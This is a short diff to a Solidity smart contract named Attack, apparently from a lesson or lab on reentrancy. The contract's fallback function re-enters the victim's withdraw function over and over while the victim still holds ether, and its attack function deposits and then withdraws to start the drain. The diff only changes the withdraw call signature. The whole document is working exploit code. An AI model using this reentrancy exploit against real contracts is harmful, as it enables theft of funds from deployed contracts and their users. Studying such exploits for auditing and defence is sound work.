@@ -11,13 +11,13 @@ contract Attack {
     
     fallback() external payable {
         if (address(victim).balance >= 1 ether){
-            victim.withdraw(1 ether);
+            victim.withdraw();
         }
     }
     
     function attack() external payable {
         require(msg.value >= 1 ether);
         victim.deposit{value: 1 ether}();
-        victim.withdraw(1 ether);
+        victim.withdraw();
     }
 }
